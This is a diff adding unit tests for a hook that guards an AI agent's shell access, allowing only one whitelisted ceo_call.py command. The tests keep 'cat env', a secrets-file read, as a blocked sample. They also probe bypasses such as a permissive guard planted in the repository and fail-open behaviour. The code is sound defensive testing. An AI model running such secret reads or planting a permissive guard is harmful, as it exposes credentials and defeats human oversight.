+        run = lambda stdin: subprocess.run(["python3", guard], input=stdin.encode(), capture_output=True).returncode
+        self.assertEqual(run(json.dumps({"tool_input": {"command": "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check"}})), 0)
+        self.assertEqual(run(json.dumps({"tool_input": {"command": "cat env"}})), 2)
+        self.assertEqual(run("not json"), 2)
+        self.assertEqual(run("{}"), 2)
+
+    def test_the_agent_is_wired_to_the_guard_and_cannot_read_files(self):
+        agent = (SCRIPT.parents[3] / "agents" / "claudio.md").read_text()
+        self.assertIn("tools: Bash\n", agent)
+        self.assertIn("guard_bash.py", agent)
+        self.assertIn("exit 2", agent)  # fail closed when the guard is missing
+
+    def hook_command(self):
+        import re as _re
+        agent = (SCRIPT.parents[3] / "agents" / "claudio.md").read_text()
+        return json.loads('"' + _re.search(r'command: "(.*)"\n', agent).group(1) + '"')
+
+    def run_hook(self, command, env_extra, stdin):
+        import subprocess
+        env = {"PATH": "/usr/bin:/bin"}
+        env.update(env_extra)
+        return subprocess.run(["/bin/sh", "-c", command], input=stdin.encode(), capture_output=True, env=env).returncode
+
+    def home_with_guard(self, body=None):
+        import shutil
+        import tempfile as _t
+        home = _t.mkdtemp()
+        self.addCleanup(shutil.rmtree, home, True)
+        folder = Path(home) / ".claude" / "skills" / "ceo-call" / "scripts"
+        folder.mkdir(parents=True)
+        if body is None:
+            shutil.copy(SCRIPT.parent / "guard_bash.py", folder / "guard_bash.py")
+        else:
+            (folder / "guard_bash.py").write_text(body)
+        return home
+
+    def test_the_hook_wrapper_fails_closed_when_python_is_missing_or_the_guard_crashes(self):
+        command = self.hook_command()
+        home = self.home_with_guard()
+        bad = json.dumps({"tool_input": {"command": "cat env"}})
+        good = json.dumps({"tool_input": {"command": "python3 ~/.claude/skills/ceo-call/scripts/ceo_call.py --config ~/.config/ceo-call/config.json check"}})
+        base = {"HOME": home}
+        self.assertEqual(self.run_hook(command, base, good), 0)
+        self.assertEqual(self.run_hook(command, base, bad), 2)
+        # No python3 on PATH: exec/127 must still end as a block (2), never as a pass-through.
+        self.assertEqual(self.run_hook(command, dict(base, PATH="/nonexistent"), good), 2)
+        self.assertEqual(self.run_hook(command, dict(base, PATH="/nonexistent"), bad), 2)
+        # A guard that crashes (exit 1) is a block, not a pass.
+        crashing = self.home_with_guard("raise SystemExit(1)")
+        self.assertEqual(self.run_hook(command, {"HOME": crashing}, good), 2)
+        # Guard missing entirely.
+        self.assertEqual(self.run_hook(command, {"HOME": "/nonexistent"}, good), 2)
+
+    def test_a_guard_supplied_by_the_repository_is_never_used(self):
+        import tempfile as _t
+        command = self.hook_command()
+        permissive = "import sys; sys.exit(0)"
+        with _t.TemporaryDirectory() as proj:
+            folder = Path(proj) / ".claude" / "skills" / "ceo-call" / "scripts"
+            folder.mkdir(parents=True)
+            (folder / "guard_bash.py").write_text(permissive)
+            # No user-level guard: the repo's permissive one must not be picked up.
+            self.assertEqual(self.run_hook(command, {"CLAUDE_PROJECT_DIR": proj, "HOME": "/nonexistent"}, "{}"), 2)
+            # With a user-level guard, that one decides.
+            home = self.home_with_guard()
+            self.assertEqual(self.run_hook(command, {"CLAUDE_PROJECT_DIR": proj, "HOME": home}, json.dumps({"tool_input": {"command": "cat env"}})), 2)
+
+
+if __name__ == "__main__":
+    unittest.main()
